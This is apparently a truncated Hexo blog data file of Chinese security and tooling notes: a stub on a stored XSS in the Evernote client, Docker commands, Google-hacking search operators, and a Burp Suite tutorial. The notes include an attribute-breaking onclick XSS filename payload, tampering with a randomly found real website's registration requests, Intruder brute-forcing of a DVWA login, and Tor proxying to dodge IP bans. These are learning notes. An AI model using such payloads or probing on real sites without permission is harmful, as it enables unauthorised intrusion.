class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"xss","date":"2018-11-06T06:43:30.000Z","_content":"\n1.印象笔记6.14客户端版本\n存储型xss,上传的图片保存时为用户输入名字，(某个属性，src属性或者value属性?)未过滤编码等。\nsrc属性或者value属性?\n<img .. src=\"图片路径 + 图片名\">\n<img .. src=\"图片路径 + \" onclick=\"xss\">.jpg \">\n","source":"_posts/security/xss.md","raw":"---\ntitle: xss\ndate: 2018-11-06 14:43:30\ntags:\n---\n\n1.印象笔记6.14客户端版本\n存储型xss,上传的图片保存时为用户输入名字，(某个属性，src属性或者value属性?)未过滤编码等。\nsrc属性或者value属性?\n<img .. src=\"图片路径 + 图片名\">\n<img .. src=\"图片路径 + \" onclick=\"xss\">.jpg \">\n","slug":"security/xss","published":1,"updated":"2018-11-06T06:49:54.709Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr640524001f6cvpubk4runa","content":"<p>1.印象笔记6.14客户端版本<br>存储型xss,上传的图片保存时为用户输入名字，(某个属性，src属性或者value属性?)未过滤编码等。<br>src属性或者value属性?<br><img ..=\"\" src=\"图片路径 + 图片名\"><br><img ..=\"\" src=\"图片路径 + \" onclick=\"xss\">.jpg “&gt;</p>\n","site":{"data":{}},"excerpt":"","more":"<p>1.印象笔记6.14客户端版本<br>存储型xss,上传的图片保存时为用户输入名字，(某个属性，src属性或者value属性?)未过滤编码等。<br>src属性或者value属性?<br><img ..=\"\" src=\"图片路径 + 图片名\"><br><img ..=\"\" src=\"图片路径 + \" onclick=\"xss\">.jpg “&gt;</p>\n"},{"title":"docker","date":"2019-01-16T09:25:54.000Z","_content":"docker的本意是希望容器是无状态的，即箱子有什么就用什么，我们外部不做修改，如果我需要改代码则重新build一个image出来。<br>\n镜像与容器，我的理解是将自己的程序做成镜像，放到容器中运行，容器提供运行环境。\n#### 一.install\nubuntu 16.04 LTS<br>\n##### 1.sudo apt install docker.io\n##### 2.阿里镜像加速\n```\nsudo mkdir -p /etc/docker\nsudo tee /etc/docker/daemon.json <<-'EOF'\n{\n  \"registry-mirrors\": [\"https://etuznpiq.mirror.aliyuncs.com\"]\n}\nEOF\nsudo systemctl daemon-reload\nsudo systemctl restart docker\n```\n保存为sh,执行\n##### 3.重启\nservie docker restart\n##### 4.登录\nsudo docker login --username=17888824094 registry.cn-hangzhou.aliyuncs.com\n##### 5.拉取远程镜像\nsudo docker pull microsoft/aci-helloworld\n##### 6.启动\n这是启动镜像<br>\ndocker run  镜像 (-d deamon模式)<br>\n例: docker run -d -p 8888:80 microsoft/aci-helloworld<br>\n-p：物理机端口，要转发的端口，可以多个端口 -p 8888:8888 8889:8889 3000:3000<br>\n目录挂载:-v $PWD/www:/www  将主机中当前目录下的www挂载到容器的/www\n##### 7.查看\ndocker ps 查看容器信息<br>\ndocker logs 容器id   查看容器内日志\n##### 8.关闭\n这是操作的容器<br>\ndocker stop 容器id<br>\ndocker ps -a  查看关闭的容器<br>\ndocker restart 容器id    重启容器<br>\ndocker rm 容器id  删除容器\n##### 9.进入container\nsudo docker exec  -it 9a8(容器id前三位) /bin/sh<br>\n交互模式， /bin/sh为要使用的$PATH,进入容器内进行操作\n##### 10.保存对容器的修改\n对容器的修改默认是保存的<br>\ndocker commit 698 name(生成一个新的版本名)\n##### 11.生成自己的image\n","source":"_posts/tools/docker.md","raw":"---\ntitle: docker\ndate: 2019-01-16 17:25:54\ntags: [tools]\n---\ndocker的本意是希望容器是无状态的，即箱子有什么就用什么，我们外部不做修改，如果我需要改代码则重新build一个image出来。<br>\n镜像与容器，我的理解是将自己的程序做成镜像，放到容器中运行，容器提供运行环境。\n#### 一.install\nubuntu 16.04 LTS<br>\n##### 1.sudo apt install docker.io\n##### 2.阿里镜像加速\n```\nsudo mkdir -p /etc/docker\nsudo tee /etc/docker/daemon.json <<-'EOF'\n{\n  \"registry-mirrors\": [\"https://etuznpiq.mirror.aliyuncs.com\"]\n}\nEOF\nsudo systemctl daemon-reload\nsudo systemctl restart docker\n```\n保存为sh,执行\n##### 3.重启\nservie docker restart\n##### 4.登录\nsudo docker login --username=17888824094 registry.cn-hangzhou.aliyuncs.com\n##### 5.拉取远程镜像\nsudo docker pull microsoft/aci-helloworld\n##### 6.启动\n这是启动镜像<br>\ndocker run  镜像 (-d deamon模式)<br>\n例: docker run -d -p 8888:80 microsoft/aci-helloworld<br>\n-p：物理机端口，要转发的端口，可以多个端口 -p 8888:8888 8889:8889 3000:3000<br>\n目录挂载:-v $PWD/www:/www  将主机中当前目录下的www挂载到容器的/www\n##### 7.查看\ndocker ps 查看容器信息<br>\ndocker logs 容器id   查看容器内日志\n##### 8.关闭\n这是操作的容器<br>\ndocker stop 容器id<br>\ndocker ps -a  查看关闭的容器<br>\ndocker restart 容器id    重启容器<br>\ndocker rm 容器id  删除容器\n##### 9.进入container\nsudo docker exec  -it 9a8(容器id前三位) /bin/sh<br>\n交互模式， /bin/sh为要使用的$PATH,进入容器内进行操作\n##### 10.保存对容器的修改\n对容器的修改默认是保存的<br>\ndocker commit 698 name(生成一个新的版本名)\n##### 11.生成自己的image\n","slug":"tools/docker","published":1,"updated":"2019-01-17T07:29:57.490Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr640526001h6cvpkz4guylk","content":"<p>docker的本意是希望容器是无状态的，即箱子有什么就用什么，我们外部不做修改，如果我需要改代码则重新build一个image出来。<br><br>镜像与容器，我的理解是将自己的程序做成镜像，放到容器中运行，容器提供运行环境。</p>\n<h4 id=\"一-install\"><a href=\"#一-install\" class=\"headerlink\" title=\"一.install\"></a>一.install</h4><p>ubuntu 16.04 LTS<br></p>\n<h5 id=\"1-sudo-apt-install-docker-io\"><a href=\"#1-sudo-apt-install-docker-io\" class=\"headerlink\" title=\"1.sudo apt install docker.io\"></a>1.sudo apt install docker.io</h5><h5 id=\"2-阿里镜像加速\"><a href=\"#2-阿里镜像加速\" class=\"headerlink\" title=\"2.阿里镜像加速\"></a>2.阿里镜像加速</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo mkdir -p /etc/docker</span><br><span class=\"line\">sudo tee /etc/docker/daemon.json &lt;&lt;-&apos;EOF&apos;</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;registry-mirrors&quot;: [&quot;https://etuznpiq.mirror.aliyuncs.com&quot;]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">EOF</span><br><span class=\"line\">sudo systemctl daemon-reload</span><br><span class=\"line\">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>\n<p>保存为sh,执行</p>\n<h5 id=\"3-重启\"><a href=\"#3-重启\" class=\"headerlink\" title=\"3.重启\"></a>3.重启</h5><p>servie docker restart</p>\n<h5 id=\"4-登录\"><a href=\"#4-登录\" class=\"headerlink\" title=\"4.登录\"></a>4.登录</h5><p>sudo docker login –username=17888824094 registry.cn-hangzhou.aliyuncs.com</p>\n<h5 id=\"5-拉取远程镜像\"><a href=\"#5-拉取远程镜像\" class=\"headerlink\" title=\"5.拉取远程镜像\"></a>5.拉取远程镜像</h5><p>sudo docker pull microsoft/aci-helloworld</p>\n<h5 id=\"6-启动\"><a href=\"#6-启动\" class=\"headerlink\" title=\"6.启动\"></a>6.启动</h5><p>这是启动镜像<br><br>docker run  镜像 (-d deamon模式)<br><br>例: docker run -d -p 8888:80 microsoft/aci-helloworld<br><br>-p：物理机端口，要转发的端口，可以多个端口 -p 8888:8888 8889:8889 3000:3000<br><br>目录挂载:-v $PWD/www:/www  将主机中当前目录下的www挂载到容器的/www</p>\n<h5 id=\"7-查看\"><a href=\"#7-查看\" class=\"headerlink\" title=\"7.查看\"></a>7.查看</h5><p>docker ps 查看容器信息<br><br>docker logs 容器id   查看容器内日志</p>\n<h5 id=\"8-关闭\"><a href=\"#8-关闭\" class=\"headerlink\" title=\"8.关闭\"></a>8.关闭</h5><p>这是操作的容器<br><br>docker stop 容器id<br><br>docker ps -a  查看关闭的容器<br><br>docker restart 容器id    重启容器<br><br>docker rm 容器id  删除容器</p>\n<h5 id=\"9-进入container\"><a href=\"#9-进入container\" class=\"headerlink\" title=\"9.进入container\"></a>9.进入container</h5><p>sudo docker exec  -it 9a8(容器id前三位) /bin/sh<br><br>交互模式， /bin/sh为要使用的$PATH,进入容器内进行操作</p>\n<h5 id=\"10-保存对容器的修改\"><a href=\"#10-保存对容器的修改\" class=\"headerlink\" title=\"10.保存对容器的修改\"></a>10.保存对容器的修改</h5><p>对容器的修改默认是保存的<br><br>docker commit 698 name(生成一个新的版本名)</p>\n<h5 id=\"11-生成自己的image\"><a href=\"#11-生成自己的image\" class=\"headerlink\" title=\"11.生成自己的image\"></a>11.生成自己的image</h5>","site":{"data":{}},"excerpt":"","more":"<p>docker的本意是希望容器是无状态的，即箱子有什么就用什么，我们外部不做修改，如果我需要改代码则重新build一个image出来。<br><br>镜像与容器，我的理解是将自己的程序做成镜像，放到容器中运行，容器提供运行环境。</p>\n<h4 id=\"一-install\"><a href=\"#一-install\" class=\"headerlink\" title=\"一.install\"></a>一.install</h4><p>ubuntu 16.04 LTS<br></p>\n<h5 id=\"1-sudo-apt-install-docker-io\"><a href=\"#1-sudo-apt-install-docker-io\" class=\"headerlink\" title=\"1.sudo apt install docker.io\"></a>1.sudo apt install docker.io</h5><h5 id=\"2-阿里镜像加速\"><a href=\"#2-阿里镜像加速\" class=\"headerlink\" title=\"2.阿里镜像加速\"></a>2.阿里镜像加速</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo mkdir -p /etc/docker</span><br><span class=\"line\">sudo tee /etc/docker/daemon.json &lt;&lt;-&apos;EOF&apos;</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;registry-mirrors&quot;: [&quot;https://etuznpiq.mirror.aliyuncs.com&quot;]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">EOF</span><br><span class=\"line\">sudo systemctl daemon-reload</span><br><span class=\"line\">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>\n<p>保存为sh,执行</p>\n<h5 id=\"3-重启\"><a href=\"#3-重启\" class=\"headerlink\" title=\"3.重启\"></a>3.重启</h5><p>servie docker restart</p>\n<h5 id=\"4-登录\"><a href=\"#4-登录\" class=\"headerlink\" title=\"4.登录\"></a>4.登录</h5><p>sudo docker login –username=17888824094 registry.cn-hangzhou.aliyuncs.com</p>\n<h5 id=\"5-拉取远程镜像\"><a href=\"#5-拉取远程镜像\" class=\"headerlink\" title=\"5.拉取远程镜像\"></a>5.拉取远程镜像</h5><p>sudo docker pull microsoft/aci-helloworld</p>\n<h5 id=\"6-启动\"><a href=\"#6-启动\" class=\"headerlink\" title=\"6.启动\"></a>6.启动</h5><p>这是启动镜像<br><br>docker run  镜像 (-d deamon模式)<br><br>例: docker run -d -p 8888:80 microsoft/aci-helloworld<br><br>-p：物理机端口，要转发的端口，可以多个端口 -p 8888:8888 8889:8889 3000:3000<br><br>目录挂载:-v $PWD/www:/www  将主机中当前目录下的www挂载到容器的/www</p>\n<h5 id=\"7-查看\"><a href=\"#7-查看\" class=\"headerlink\" title=\"7.查看\"></a>7.查看</h5><p>docker ps 查看容器信息<br><br>docker logs 容器id   查看容器内日志</p>\n<h5 id=\"8-关闭\"><a href=\"#8-关闭\" class=\"headerlink\" title=\"8.关闭\"></a>8.关闭</h5><p>这是操作的容器<br><br>docker stop 容器id<br><br>docker ps -a  查看关闭的容器<br><br>docker restart 容器id    重启容器<br><br>docker rm 容器id  删除容器</p>\n<h5 id=\"9-进入container\"><a href=\"#9-进入container\" class=\"headerlink\" title=\"9.进入container\"></a>9.进入container</h5><p>sudo docker exec  -it 9a8(容器id前三位) /bin/sh<br><br>交互模式， /bin/sh为要使用的$PATH,进入容器内进行操作</p>\n<h5 id=\"10-保存对容器的修改\"><a href=\"#10-保存对容器的修改\" class=\"headerlink\" title=\"10.保存对容器的修改\"></a>10.保存对容器的修改</h5><p>对容器的修改默认是保存的<br><br>docker commit 698 name(生成一个新的版本名)</p>\n<h5 id=\"11-生成自己的image\"><a href=\"#11-生成自己的image\" class=\"headerlink\" title=\"11.生成自己的image\"></a>11.生成自己的image</h5>"},{"title":"vim","date":"2019-01-16T06:10:33.000Z","_content":"","source":"_posts/tools/vim.md","raw":"---\ntitle: vim\ndate: 2019-01-16 14:10:33\ntags:\n---\n","slug":"tools/vim","published":1,"updated":"2019-01-16T06:10:33.569Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr640528001j6cvptgl72185","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"googlehacking","date":"2018-10-09T21:24:40.000Z","_content":"\n#### 1.GooleHacking\n利用搜索引擎的强大搜索能力，针对性的全网搜集所需资料。<br>\n\n\n#### 2.关键字\n- intext/allintext: 在正文中搜索\n- intitle/allintitle: 网页标题中， 例:intitle:后台管理，有很多\n- cache: 缓存中？？\n- filetype: 文件类型,   例:信息安全 filetype:doc\n- info: 摘要信息\n- inurl/allinurl: 在网址中\n- site: 域名，返回域名中的所有url地址，用于检查网站拓扑结构。 例: site: baidu.com\n- related: 搜索相关站点。  例:related:pku.edu.cn\n- inanchor: 在链接文本中搜索。 例：inanchor:pku.edu.cn\n- author: 新闻组贴子的作者。例:在google scholar搜索作者. author:\"John\"\n- datarange: 某个日期范围内的网页.格式为天文学儒掠日。例：”Geri Halliwell” “Spice Girls” daterange:2450958-2450968\n- weather: 天气. 例: weather:beijing\n- group:\n- stocks: 股票信息。 例:stocks:alibaba\n- define:显示某术语定义。例:define:网络安全\n- phonebook: 电话列表？？。 rphonebook:住宅电话 ; bphonebook:商业电话\n- link：搜索与当前网页存在链接的网页（不能与其他操作符或搜索关键字混合使用. 例：link:www.vvv518.com\n- msgid: 通过消息id搜索\n\n#### 3.语法\n- \"\" 精确操作\n- 关键字之间不需要间隔，空格代表逻辑与操作\n- \\- 忽略某个关键词. 例:a-b 搜索有a没b的网页\n- ～ 同义词\n- \\+ 加入被忽略的关键字。google对com等频率高的英文单词做了忽略处理，加上 + ，使之强制搜索。\n- 布尔and/or/not 例：aorb\n- 通配符，出现通配符的关键字需要用引号。\\*多个， ？和 . 单个\n\n#### 4.注意\n  1. google只能32个单词查询。<br>\n  2. 操作符、冒号、关键字之间是没有空格的。\n  3. 高级操作符能够和单独的查询混合使用\n  \n#### 5.例子\n","source":"_posts/security/googlehacking.md","raw":"---\ntitle: googlehacking\ndate: 2018-10-10 05:24:40\ntags: [渗透,google]\n---\n\n#### 1.GooleHacking\n利用搜索引擎的强大搜索能力，针对性的全网搜集所需资料。<br>\n\n\n#### 2.关键字\n- intext/allintext: 在正文中搜索\n- intitle/allintitle: 网页标题中， 例:intitle:后台管理，有很多\n- cache: 缓存中？？\n- filetype: 文件类型,   例:信息安全 filetype:doc\n- info: 摘要信息\n- inurl/allinurl: 在网址中\n- site: 域名，返回域名中的所有url地址，用于检查网站拓扑结构。 例: site: baidu.com\n- related: 搜索相关站点。  例:related:pku.edu.cn\n- inanchor: 在链接文本中搜索。 例：inanchor:pku.edu.cn\n- author: 新闻组贴子的作者。例:在google scholar搜索作者. author:\"John\"\n- datarange: 某个日期范围内的网页.格式为天文学儒掠日。例：”Geri Halliwell” “Spice Girls” daterange:2450958-2450968\n- weather: 天气. 例: weather:beijing\n- group:\n- stocks: 股票信息。 例:stocks:alibaba\n- define:显示某术语定义。例:define:网络安全\n- phonebook: 电话列表？？。 rphonebook:住宅电话 ; bphonebook:商业电话\n- link：搜索与当前网页存在链接的网页（不能与其他操作符或搜索关键字混合使用. 例：link:www.vvv518.com\n- msgid: 通过消息id搜索\n\n#### 3.语法\n- \"\" 精确操作\n- 关键字之间不需要间隔，空格代表逻辑与操作\n- \\- 忽略某个关键词. 例:a-b 搜索有a没b的网页\n- ～ 同义词\n- \\+ 加入被忽略的关键字。google对com等频率高的英文单词做了忽略处理，加上 + ，使之强制搜索。\n- 布尔and/or/not 例：aorb\n- 通配符，出现通配符的关键字需要用引号。\\*多个， ？和 . 单个\n\n#### 4.注意\n  1. google只能32个单词查询。<br>\n  2. 操作符、冒号、关键字之间是没有空格的。\n  3. 高级操作符能够和单独的查询混合使用\n  \n#### 5.例子\n","slug":"security/googlehacking","published":1,"updated":"2018-10-11T07:31:26.717Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr64052b001m6cvpcaf434u9","content":"<h4 id=\"1-GooleHacking\"><a href=\"#1-GooleHacking\" class=\"headerlink\" title=\"1.GooleHacking\"></a>1.GooleHacking</h4><p>利用搜索引擎的强大搜索能力，针对性的全网搜集所需资料。<br></p>\n<h4 id=\"2-关键字\"><a href=\"#2-关键字\" class=\"headerlink\" title=\"2.关键字\"></a>2.关键字</h4><ul>\n<li>intext/allintext: 在正文中搜索</li>\n<li>intitle/allintitle: 网页标题中， 例:intitle:后台管理，有很多</li>\n<li>cache: 缓存中？？</li>\n<li>filetype: 文件类型,   例:信息安全 filetype:doc</li>\n<li>info: 摘要信息</li>\n<li>inurl/allinurl: 在网址中</li>\n<li>site: 域名，返回域名中的所有url地址，用于检查网站拓扑结构。 例: site: baidu.com</li>\n<li>related: 搜索相关站点。  例:related:pku.edu.cn</li>\n<li>inanchor: 在链接文本中搜索。 例：inanchor:pku.edu.cn</li>\n<li>author: 新闻组贴子的作者。例:在google scholar搜索作者. author:”John”</li>\n<li>datarange: 某个日期范围内的网页.格式为天文学儒掠日。例：”Geri Halliwell” “Spice Girls” daterange:2450958-2450968</li>\n<li>weather: 天气. 例: weather:beijing</li>\n<li>group:</li>\n<li>stocks: 股票信息。 例:stocks:alibaba</li>\n<li>define:显示某术语定义。例:define:网络安全</li>\n<li>phonebook: 电话列表？？。 rphonebook:住宅电话 ; bphonebook:商业电话</li>\n<li>link：搜索与当前网页存在链接的网页（不能与其他操作符或搜索关键字混合使用. 例：link:<a href=\"http://www.vvv518.com\" target=\"_blank\" rel=\"noopener\">www.vvv518.com</a></li>\n<li>msgid: 通过消息id搜索</li>\n</ul>\n<h4 id=\"3-语法\"><a href=\"#3-语法\" class=\"headerlink\" title=\"3.语法\"></a>3.语法</h4><ul>\n<li>“” 精确操作</li>\n<li>关键字之间不需要间隔，空格代表逻辑与操作</li>\n<li>- 忽略某个关键词. 例:a-b 搜索有a没b的网页</li>\n<li>～ 同义词</li>\n<li>+ 加入被忽略的关键字。google对com等频率高的英文单词做了忽略处理，加上 + ，使之强制搜索。</li>\n<li>布尔and/or/not 例：aorb</li>\n<li>通配符，出现通配符的关键字需要用引号。*多个， ？和 . 单个</li>\n</ul>\n<h4 id=\"4-注意\"><a href=\"#4-注意\" class=\"headerlink\" title=\"4.注意\"></a>4.注意</h4><ol>\n<li>google只能32个单词查询。<br></li>\n<li>操作符、冒号、关键字之间是没有空格的。</li>\n<li>高级操作符能够和单独的查询混合使用</li>\n</ol>\n<h4 id=\"5-例子\"><a href=\"#5-例子\" class=\"headerlink\" title=\"5.例子\"></a>5.例子</h4>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-GooleHacking\"><a href=\"#1-GooleHacking\" class=\"headerlink\" title=\"1.GooleHacking\"></a>1.GooleHacking</h4><p>利用搜索引擎的强大搜索能力，针对性的全网搜集所需资料。<br></p>\n<h4 id=\"2-关键字\"><a href=\"#2-关键字\" class=\"headerlink\" title=\"2.关键字\"></a>2.关键字</h4><ul>\n<li>intext/allintext: 在正文中搜索</li>\n<li>intitle/allintitle: 网页标题中， 例:intitle:后台管理，有很多</li>\n<li>cache: 缓存中？？</li>\n<li>filetype: 文件类型,   例:信息安全 filetype:doc</li>\n<li>info: 摘要信息</li>\n<li>inurl/allinurl: 在网址中</li>\n<li>site: 域名，返回域名中的所有url地址，用于检查网站拓扑结构。 例: site: baidu.com</li>\n<li>related: 搜索相关站点。  例:related:pku.edu.cn</li>\n<li>inanchor: 在链接文本中搜索。 例：inanchor:pku.edu.cn</li>\n<li>author: 新闻组贴子的作者。例:在google scholar搜索作者. author:”John”</li>\n<li>datarange: 某个日期范围内的网页.格式为天文学儒掠日。例：”Geri Halliwell” “Spice Girls” daterange:2450958-2450968</li>\n<li>weather: 天气. 例: weather:beijing</li>\n<li>group:</li>\n<li>stocks: 股票信息。 例:stocks:alibaba</li>\n<li>define:显示某术语定义。例:define:网络安全</li>\n<li>phonebook: 电话列表？？。 rphonebook:住宅电话 ; bphonebook:商业电话</li>\n<li>link：搜索与当前网页存在链接的网页（不能与其他操作符或搜索关键字混合使用. 例：link:<a href=\"http://www.vvv518.com\" target=\"_blank\" rel=\"noopener\">www.vvv518.com</a></li>\n<li>msgid: 通过消息id搜索</li>\n</ul>\n<h4 id=\"3-语法\"><a href=\"#3-语法\" class=\"headerlink\" title=\"3.语法\"></a>3.语法</h4><ul>\n<li>“” 精确操作</li>\n<li>关键字之间不需要间隔，空格代表逻辑与操作</li>\n<li>- 忽略某个关键词. 例:a-b 搜索有a没b的网页</li>\n<li>～ 同义词</li>\n<li>+ 加入被忽略的关键字。google对com等频率高的英文单词做了忽略处理，加上 + ，使之强制搜索。</li>\n<li>布尔and/or/not 例：aorb</li>\n<li>通配符，出现通配符的关键字需要用引号。*多个， ？和 . 单个</li>\n</ul>\n<h4 id=\"4-注意\"><a href=\"#4-注意\" class=\"headerlink\" title=\"4.注意\"></a>4.注意</h4><ol>\n<li>google只能32个单词查询。<br></li>\n<li>操作符、冒号、关键字之间是没有空格的。</li>\n<li>高级操作符能够和单独的查询混合使用</li>\n</ol>\n<h4 id=\"5-例子\"><a href=\"#5-例子\" class=\"headerlink\" title=\"5.例子\"></a>5.例子</h4>"},{"title":"burpsuite","date":"2018-12-12T02:48:18.000Z","_content":"\n#### 1.配置\n先配置浏览器代理，127.0.0.1：8080，使所有流量都要经过这<br>\n  ![proxy_1](../../images/security/burpsuite/chrome_proxy.png)\n\n  ![proxy_1_1](../../images/security/burpsuite/chrome_proxy2.png)\n\n再配置burpsuite监听这个端口的流量<br>\n  ![proxy_2](../../images/security/burpsuite/burpsuite_proxy.png)\n\n此外 ，因为要访问https,配置完这些后，打开浏览器访问http://burp，下载证书，安装到受信任颁发机构<br>\n![proxy_3](../../images/security/burpsuite/burpsuite_ca_certificate.png)\n![proxy_3_1](../../images/security/burpsuite/ca_certificate_install.png)\n\n#### 实战\n##### 1.第一个抓包小例子\n1.先随意搜索后台登录页面,inurl:login.html,在这里我随机找了一个http://usr.005.tv/User/login.html\n![login_page_1](../../images/security/burpsuite/usr005tv_login_page1.png)\n先点击注册\n![register_page_1](../../images/security/burpsuite/usr005tv_register1.png)\n\n<br>\n<strong>其中我们邮箱和手机号都是填的假号码。\n然后开始拦截抓包，滑动滑块\n\n![package1](../../images/security/burpsuite/usr005tv_package_1.png)\n修改号码为自己手机号，收到验证码\n![package1](../../images/security/burpsuite/usr005tv_package_2.png)\n输入验证码\n![package1](../../images/security/burpsuite/usr005tv_package_3.png)\n在这里发现，后端验证时，同时验证了发送验证码的手机号和验证码，所以验证失败，如果在这也修改为自己手机号，那注册时的假号码就无意义了。\n\n##### 2.一个爆破小例子\n来dvwn的登录（admin/password）\n![intruder_01](../../images/security/burpsuite/dvwn_login_1.png)\n随便输入，抓取数据包，send to intruder\n![intruder_02](../../images/security/burpsuite/burpsuite_intruder_01.png)\n选择Cluster模式，可以使用同的字典，进行穷举（笛卡尔积）<br>\n然后，clear清空变量，鼠标选中后，add添加自己需要的变量\n![intruder_03](../../images/security/burpsuite/burpsuite_intruder_02.png)\n分别添加变量对应的字典，进行爆破\n![intruder_04](../../images/security/burpsuite/burpsuite_intruder_03.png)\n爆破完成后，点击length，查看length长度(正确的和错误的length长度会不样)\n![intruder_05](../../images/security/burpsuite/burpsuite_intruder_04.png)\n\n#### 问题\n1.使用burpsuite抓包后，vpn没用了，不能访问外网<br>\n\n解决1，虚拟机里使用burpsuite,nat模式连接，物理机还是挂了vpn<br>\n\n2018/12/20 添加:<br>\n解决2，使用代理链 https://www.anquanke.com/post/id/85925<br>\n同理，也可以使用代理链来用tor进行代理(防封ip)\n![proxy_chain_01](../../images/security/burpsuite/proxy_chain_01.png)\n不稳定，容易出错：SOCKS server general failure<br>\n原因待查。。。\n","source":"_posts/security/burpsuite.md","raw":"---\ntitle: burpsuite\ndate: 2018-12-12 10:48:18\ntags: [burpsuite]\n---\n\n#### 1.配置\n先配置浏览器代理，127.0.0.1：8080，使所有流量都要经过这<br>\n  ![proxy_1](../../images/security/burpsuite/chrome_proxy.png)\n\n  ![proxy_1_1](../../images/security/burpsuite/chrome_proxy2.png)\n\n再配置burpsuite监听这个端口的流量<br>\n  ![proxy_2](../../images/security/burpsuite/burpsuite_proxy.png)\n\n此外 ，因为要访问https,配置完这些后，打开浏览器访问http://burp，下载证书，安装到受信任颁发机构<br>\n![proxy_3](../../images/security/burpsuite/burpsuite_ca_certificate.png)\n![proxy_3_1](../../images/security/burpsuite/ca_certificate_install.png)\n\n#### 实战\n##### 1.第一个抓包小例子\n1.先随意搜索后台登录页面,inurl:login.html,在这里我随机找了一个http://usr.005.tv/User/login.html\n![login_page_1](../../images/security/burpsuite/usr005tv_login_page1.png)\n先点击注册\n![register_page_1](../../images/security/burpsuite/usr005tv_register1.png)\n\n<br>\n<strong>其中我们邮箱和手机号都是填的假号码。\n然后开始拦截抓包，滑动滑块\n\n![package1](../../images/security/burpsuite/usr005tv_package_1.png)\n修改号码为自己手机号，收到验证码\n![package1](../../images/security/burpsuite/usr005tv_package_2.png)\n输入验证码\n![package1](../../images/security/burpsuite/usr005tv_package_3.png)\n在这里发现，后端验证时，同时验证了发送验证码的手机号和验证码，所以验证失败，如果在这也修改为自己手机号，那注册时的假号码就无意义了。\n\n##### 2.一个爆破小例子\n来dvwn的登录（admin/password）\n![intruder_01](../../images/security/burpsuite/dvwn_login_1.png)\n随便输入，抓取数据包，send to intruder\n![intruder_02](../../images/security/burpsuite/burpsuite_intruder_01.png)\n选择Cluster模式，可以使用同的字典，进行穷举（笛卡尔积）<br>\n然后，clear清空变量，鼠标选中后，add添加自己需要的变量\n![intruder_03](../../images/security/burpsuite/burpsuite_intruder_02.png)\n分别添加变量对应的字典，进行爆破\n![intruder_04](../../images/security/burpsuite/burpsuite_intruder_03.png)\n爆破完成后，点击length，查看length长度(正确的和错误的length长度会不样)\n![intruder_05](../../images/security/burpsuite/burpsuite_intruder_04.png)\n\n#### 问题\n1.使用burpsuite抓包后，vpn没用了，不能访问外网<br>\n\n解决1，虚拟机里使用burpsuite,nat模式连接，物理机还是挂了vpn<br>\n\n2018/12/20 添加:<br>\n解决2，使用代理链 https://www.anquanke.com/post/id/85925<br>\n同理，也可以使用代理链来用tor进行代理(防封ip)\n![proxy_chain_01](../../images/security/burpsuite/proxy_chain_01.png)\n不稳定，容易出错：SOCKS server general failure<br>\n原因待查。。。\n","slug":"security/burpsuite","published":1,"updated":"2018-12-20T09:52:39.709Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr64052d001o6cvpza2tchry","content":"<h4 id=\"1-配置\"><a href=\"#1-配置\" class=\"headerlink\" title=\"1.配置\"></a>1.配置</h4><p>先配置浏览器代理，127.0.0.1：8080，使所有流量都要经过这<br><br>  <img src=\"../../images/security/burpsuite/chrome_proxy.png\" alt=\"proxy_1\"></p>\n<p>  <img src=\"../../images/security/burpsuite/chrome_proxy2.png\" alt=\"proxy_1_1\"></p>\n<p>再配置burpsuite监听这个端口的流量<br><br>  <img src=\"../../images/security/burpsuite/burpsuite_proxy.png\" alt=\"proxy_2\"></p>\n<p>此外 ，因为要访问https,配置完这些后，打开浏览器访问<a href=\"http://burp，下载证书，安装到受信任颁发机构\" target=\"_blank\" rel=\"noopener\">http://burp，下载证书，安装到受信任颁发机构</a><br><br><img src=\"../../images/security/burpsuite/burpsuite_ca_certificate.png\" alt=\"proxy_3\"><br><img src=\"../../images/security/burpsuite/ca_certificate_install.png\" alt=\"proxy_3_1\"></p>\n<h4 id=\"实战\"><a href=\"#实战\" class=\"headerlink\" title=\"实战\"></a>实战</h4><h5 id=\"1-第一个抓包小例子\"><a href=\"#1-第一个抓包小例子\" class=\"headerlink\" title=\"1.第一个抓包小例子\"></a>1.第一个抓包小例子</h5><p>1.先随意搜索后台登录页面,inurl:login.html,在这里我随机找了一个<a href=\"http://usr.005.tv/User/login.html\" target=\"_blank\" rel=\"noopener\">http://usr.005.tv/User/login.html</a><br><img src=\"../../images/security/burpsuite/usr005tv_login_page1.png\" alt=\"login_page_1\"><br>先点击注册<br><img src=\"../../images/security/burpsuite/usr005tv_register1.png\" alt=\"register_page_1\"></p>\n<p><br><br><strong>其中我们邮箱和手机号都是填的假号码。<br>然后开始拦截抓包，滑动滑块</strong></p>\n<p><img src=\"../../images/security/burpsuite/usr005tv_package_1.png\" alt=\"package1\"><br>修改号码为自己手机号，收到验证码<br><img src=\"../../images/security/burpsuite/usr005tv_package_2.png\" alt=\"package1\"><br>输入验证码<br><img src=\"../../images/security/burpsuite/usr005tv_package_3.png\" alt=\"package1\"><br>在这里发现，后端验证时，同时验证了发送验证码的手机号和验证码，所以验证失败，如果在这也修改为自己手机号，那注册时的假号码就无意义了。</p>\n<h5 id=\"2-一个爆破小例子\"><a href=\"#2-一个爆破小例子\" class=\"headerlink\" 